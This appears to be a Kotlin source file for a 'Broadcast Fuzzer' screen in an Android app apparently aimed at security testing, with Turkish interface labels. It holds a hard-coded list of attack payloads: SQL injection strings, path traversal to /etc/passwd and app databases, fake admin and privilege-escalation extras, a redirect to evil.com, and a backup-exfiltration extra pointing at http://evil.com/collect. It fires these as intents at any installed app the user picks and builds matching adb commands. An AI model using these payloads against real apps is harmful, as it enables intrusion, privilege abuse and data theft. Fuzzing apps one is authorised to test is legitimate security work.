package com.androhunter.app.ui.broadcast

import android.content.Intent
import android.content.pm.PackageManager
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.androhunter.app.ui.common.HunterTopBar
import com.androhunter.app.ui.theme.*

data class BroadcastPayload(
    val name: String,
    val action: String,
    val extras: Map<String, String>,
    val category: String,
    val severity: String
)

private val BROADCAST_PAYLOADS = listOf(
    // Auth/Session
    BroadcastPayload("Login Bypass", "android.intent.action.BOOT_COMPLETED",
        mapOf("authenticated" to "true", "user_id" to "1", "admin" to "true"), "Auth", "HIGH"),
    BroadcastPayload("Session Hijack", "com.TARGET.SESSION_UPDATE",
        mapOf("session_id" to "admin_session_12345", "role" to "admin"), "Auth", "HIGH"),
    // SQLi via broadcast
    BroadcastPayload("SQLi via Extra", "com.TARGET.DATA_SYNC",
        mapOf("query" to "' OR 1=1--", "user" to "admin'--"), "SQLi", "CRITICAL"),
    BroadcastPayload("SQLi UNION", "com.TARGET.SEARCH",
        mapOf("keyword" to "' UNION SELECT null,null--", "filter" to "1 OR 1=1"), "SQLi", "CRITICAL"),
    // Path traversal
    BroadcastPayload("Path Traversal", "com.TARGET.FILE_OPEN",
        mapOf("path" to "../../../data/data/TARGET/databases/", "file" to "../../../../etc/passwd"), "LFI", "HIGH"),
    // Intent redirect
    BroadcastPayload("Open Redirect", "com.TARGET.OPEN_URL",
        mapOf("url" to "javascript:alert(1)", "redirect" to "https://evil.com"), "Redirect", "MEDIUM"),
    BroadcastPayload("Deep Link Hijack", "android.intent.action.VIEW",
        mapOf("data" to "file:///data/data/TARGET/shared_prefs/"), "Redirect", "HIGH"),
    // Privilege escalation
    BroadcastPayload("Privilege Escalation", "com.TARGET.ADMIN_ACTION",
        mapOf("action" to "grant_admin", "target_uid" to "0"), "PrivEsc", "CRITICAL"),
    BroadcastPayload("Component Enable", "com.TARGET.TOGGLE_COMPONENT",
        mapOf("component" to "com.TARGET.HiddenActivity", "enabled" to "true"), "PrivEsc", "HIGH"),
    // Data exfil
    BroadcastPayload("Data Exfil", "com.TARGET.BACKUP",
        mapOf("destination" to "http://evil.com/collect", "include_prefs" to "true"), "Exfil", "HIGH"),
)

data class BroadcastResult(
    val payload: BroadcastPayload,
    val status: String,
    val detail: String
)

@Composable
fun BroadcastFuzzerScreen(onBack: () -> Unit) {
    val context   = LocalContext.current
    val clipboard = LocalClipboardManager.current

    val installedApps = remember {
        context.packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
            .filter { it.sourceDir.isNotBlank() }
            .sortedBy { context.packageManager.getApplicationLabel(it).toString() }
    }

    var selectedPkg  by remember { mutableStateOf<String?>(null) }
    var customAction by remember { mutableStateOf("") }
    var customExtra  by remember { mutableStateOf("") }
    val results      = remember { mutableStateListOf<BroadcastResult>() }
    var filterCat    by remember { mutableStateOf<String?>(null) }
    var sending      by remember { mutableStateOf(false) }

    val categories = listOf(null, "Auth", "SQLi", "LFI", "Redirect", "PrivEsc", "Exfil")
    val filtered   = BROADCAST_PAYLOADS.filter { filterCat == null || it.category == filterCat }

    fun sendBroadcast(payload: BroadcastPayload, pkg: String) {
        try {
            val intent = Intent(payload.action.replace("TARGET", pkg)).apply {
                setPackage(pkg)
                payload.extras.forEach { (k, v) ->
                    putExtra(k, v.replace("TARGET", pkg))
                }
            }
            context.sendBroadcast(intent)
            results.add(0, BroadcastResult(payload, "SENT", "Gönderildi → yanıt izleyin"))
        } catch (e: Exception) {
            results.add(0, BroadcastResult(payload, "ERR", e.message?.take(80) ?: "Hata"))
        }
    }

    fun buildAdbCmd(payload: BroadcastPayload, pkg: String): String {
        val sb = StringBuilder("adb shell am broadcast -a ${payload.action.replace("TARGET", pkg)}")
        sb.append(" -p $pkg")
        payload.extras.forEach { (k, v) ->
            sb.append(" --es $k \"${v.replace("TARGET", pkg)}\"")
        }
        return sb.toString()
    }

    fun sendCustom(pkg: String) {
        try {
            val extras = customExtra.split(",").filter { it.contains("=") }
            val intent = Intent(customAction).apply {
                setPackage(pkg)
                extras.forEach { pair ->
                    val (k, v) = pair.split("=", limit=2)
                    putExtra(k.trim(), v.trim())
                }
            }
            context.sendBroadcast(intent)
            results.add(0, BroadcastResult(
                BroadcastPayload("Custom", customAction, emptyMap(), "Custom", "INFO"),
                "SENT", "Custom broadcast gönderildi"
            ))
        } catch (e: Exception) {
            results.add(0, BroadcastResult(
                BroadcastPayload("Custom", customAction, emptyMap(), "Custom", "INFO"),
                "ERR", e.message?.take(80) ?: ""
            ))
        }
    }

    Column(Modifier.fillMaxSize().background(HunterBg)) {
        HunterTopBar("BROADCAST FUZZER", onBack)

        LazyColumn(contentPadding=PaddingValues(12.dp), verticalArrangement=Arrangement.spacedBy(8.dp)) {
            // App selector
            item {
                Text("HEDEF UYGULAMA", color=HunterDim, fontFamily=FontFamily.Monospace, fontSize=11.sp)
                Spacer(Modifier.height(4.dp))
                LazyColumn(Modifier.height(130.dp)) {
                    items(installedApps.take(60)) { app ->
                        val label = context.packageManager.getApplicationLabel(app).toString()
                        val isSel = selectedPkg == app.packageName
                        Row(
                            Modifier.fillMaxWidth()
                                .background(if(isSel) HunterGreen.copy(alpha=0.1f) else HunterCard, RoundedCornerShape(4.dp))
                                .padding(horizontal=10.dp, vertical=5.dp),
                            horizontalArrangement=Arrangement.SpaceBetween,
                            verticalAlignment=Alignment.CenterVertically
                        ) {
                            Column(Modifier.weight(1f)) {
                                Text(label, color=if(isSel)HunterGreen else HunterText,
                                    fontFamily=FontFamily.Monospace, fontWeight=FontWeight.Bold, fontSize=11.sp)
                                Text(app.packageName, color=HunterDim, fontFamily=FontFamily.Monospace, fontSize=9.sp)
                            }
                            RadioButton(selected=isSel, onClick={selectedPkg=app.packageName},
                                colors=RadioButtonDefaults.colors(selectedColor=HunterGreen))
                        }
                        Spacer(Modifier.height(2.dp))
                    }
                }
            }

            // Custom broadcast
            item {
                Column(
                    Modifier.fillMaxWidth()
                        .background(HunterCard, RoundedCornerShape(6.dp))
                        .border(1.dp, HunterBorder, RoundedCornerShape(6.dp))
                        .padding(10.dp),
                    verticalArrangement=Arrangement.spacedBy(6.dp)
                ) {
                    Text("ÖZEL BROADCAST", color=HunterDim, fontFamily=FontFamily.Monospace,
                        fontWeight=FontWeight.Bold, fontSize=11.sp)
                    OutlinedTextField(
                        value=customAction, onValueChange={customAction=it},
                        label={Text("Action", fontFamily=FontFamily.Monospace, fontSize=11.sp)},
                        placeholder={Text("com.target.app.ACTION", color=HunterDim, fontFamily=FontFamily.Monospace, fontSize=11.sp)},
                        modifier=Modifier.fillMaxWidth(), singleLine=true,
                        textStyle=androidx.compose.ui.text.TextStyle(color=HunterGreen, fontFamily=FontFamily.Monospace),
                        colors=OutlinedTextFieldDefaults.colors(
                            focusedBorderColor=HunterGreen, unfocusedBorderColor=HunterBorder,
                            focusedLabelColor=HunterGreen, unfocusedLabelColor=HunterDim)
                    )
                    OutlinedTextField(
                        value=customExtra, onValueChange={customExtra=it},
                        label={Text("Extras (key=val,key2=val2)", fontFamily=FontFamily.Monospace, fontSize=11.sp)},
                        modifier=Modifier.fillMaxWidth(), singleLine=true,
                        textStyle=androidx.compose.ui.text.TextStyle(color=HunterGreen, fontFamily=FontFamily.Monospace),
                        colors=OutlinedTextFieldDefaults.colors(
                            focusedBorderColor=HunterGreen, unfocusedBorderColor=HunterBorder,
                            focusedLabelColor=HunterGreen, unfocusedLabelColor=HunterDim)
                    )
                    Button(
                        onClick={ selectedPkg?.let { sendCustom(it) } },
                        enabled=selectedPkg!=null && customAction.isNotBlank(),
                        modifier=Modifier.fillMaxWidth().height(36.dp),
                        colors=ButtonDefaults.buttonColors(containerColor=HunterGreen.copy(alpha=0.15f)),
                        shape=RoundedCornerShape(4.dp),
                        border=androidx.compose.foundation.BorderStroke(1.dp, HunterGreen.copy(alpha=0.5f))
                    ) { Text("[ GÖNDER ]", color=HunterGreen, fontFamily=FontFamily.Monospace,
                        fontWeight=FontWeight.Bold, fontSize=12.sp) }
                }
            }

            // Category filter
            item {
                Row(Modifier.fillMaxWidth(), horizontalArrangement=Arrangement.spacedBy(4.dp)) {
                    categories.forEach { cat ->
                        val color = when(cat) {
                            "SQLi","PrivEsc" -> HunterRed; "Auth","LFI" -> HunterYellow
                            "Redirect" -> HunterBlue; "Exfil" -> HunterPurple; else -> HunterDim
                        }
                        FilterChip(selected=filterCat==cat, onClick={filterCat=cat},
                            label={Text(cat?:"ALL", fontFamily=FontFamily.Monospace, fontSize=9.sp)},
                            colors=FilterChipDefaults.filterChipColors(
                                containerColor=HunterCard, labelColor=HunterDim,
                                selectedContainerColor=color.copy(alpha=0.2f), selectedLabelColor=color))
                    }
                }
            }

            // Payload list
            items(filtered) { payload ->
                val sevColor = when(payload.severity) {
                    "CRITICAL" -> HunterRed; "HIGH" -> HunterYellow; else -> HunterBlue
                }
                Column(
                    Modifier.fillMaxWidth()
                        .background(HunterCard, RoundedCornerShape(6.dp))
                        .border(1.dp, sevColor.copy(alpha=0.3f), RoundedCornerShape(6.dp))
                        .padding(10.dp)
                ) {
                    Row(verticalAlignment=Alignment.CenterVertically,
                        horizontalArrangement=Arrangement.spacedBy(6.dp)) {
                        Surface(color=sevColor.copy(alpha=0.15f), shape=RoundedCornerShape(3.dp)) {
                            Text(payload.severity, color=sevColor, fontFamily=FontFamily.Monospace,
                                fontWeight=FontWeight.Bold, fontSize=8.sp,
                                modifier=Modifier.padding(horizontal=5.dp, vertical=2.dp))
                        }
                        Surface(color=HunterSurface, shape=RoundedCornerShape(3.dp)) {
                            Text(payload.category, color=HunterDim, fontFamily=FontFamily.Monospace,
                                fontSize=8.sp, modifier=Modifier.padding(horizontal=4.dp, vertical=2.dp))
                        }
                    }
                    Spacer(Modifier.height(4.dp))
                    Text(payload.name, color=sevColor, fontFamily=FontFamily.Monospace,
                        fontWeight=FontWeight.Bold, fontSize=13.sp)
                    Text(payload.action.replace("TARGET", selectedPkg ?: "com.target.app"),
                        color=HunterDim, fontFamily=FontFamily.Monospace, fontSize=10.sp)
                    Spacer(Modifier.height(4.dp))
                    payload.extras.forEach { (k,v) ->
                        Text("  $k = ${v.replace("TARGET", selectedPkg ?: "com.target.app")}",
                            color=HunterGreen, fontFamily=FontFamily.Monospace, fontSize=10.sp)
                    }
                    Spacer(Modifier.height(8.dp))
                    Row(horizontalArrangement=Arrangement.spacedBy(6.dp)) {
                        Button(
                            onClick={selectedPkg?.let{sendBroadcast(payload, it)}},
                            enabled=selectedPkg!=null,
                            modifier=Modifier.weight(1f).height(36.dp),
                            colors=ButtonDefaults.buttonColors(containerColor=sevColor.copy(alpha=0.15f)),
                            shape=RoundedCornerShape(4.dp),
                            border=androidx.compose.foundation.BorderStroke(1.dp, sevColor.copy(alpha=0.5f))
                        ) { Text("[ GÖNDER ]", color=sevColor, fontFamily=FontFamily.Monospace,
                            fontWeight=FontWeight.Bold, fontSize=11.sp) }
                        Button(
                            onClick={clipboard.setText(AnnotatedString(buildAdbCmd(payload, selectedPkg ?: "com.pkg")))},
                            modifier=Modifier.weight(1f).height(36.dp),
                            colors=ButtonDefaults.buttonColors(containerColor=HunterBlue.copy(alpha=0.1f)),
                            shape=RoundedCornerShape(4.dp),
                            border=androidx.compose.foundation.BorderStroke(1.dp, HunterBlue.copy(alpha=0.4f))
                        ) { Text("[ ADB ]", color=HunterBlue, fontFamily=FontFamily.Monospace,
                            fontWeight=FontWeight.Bold, fontSize=11.sp) }
                    }
                }
            }

            // Results
            if (results.isNotEmpty()) {
                item {
                    Text("SONUÇLAR (${results.size})", color=HunterDim, fontFamily=FontFamily.Monospace,
                        fontWeight=FontWeight.Bold, fontSize=11.sp)
                }
                items(results.take(20)) { r ->
                    val color = if(r.status=="SENT") HunterGreen else HunterRed
                    Row(
                        Modifier.fillMaxWidth()
                            .background(color.copy(alpha=0.06f), RoundedCornerShape(4.dp))
                            .border(1.dp, color.copy(alpha=0.3f), RoundedCornerShape(4.dp))
                            .padding(8.dp),
                        horizontalArrangement=Arrangement.spacedBy(8.dp),
                        verticalAlignment=Alignment.CenterVertically
                    ) {
                        Text(if(r.status=="SENT")"✓" else "✗", color=color, fontSize=14.sp)
                        Column(Modifier.weight(1f)) {
                            Text(r.payload.name, color=color, fontFamily=FontFamily.Monospace,
                                fontWeight=FontWeight.Bold, fontSize=11.sp)
                            Text(r.detail, color=HunterDim, fontFamily=FontFamily.Monospace, fontSize=10.sp)
                        }
                    }
                }
            }
        }
    }
}
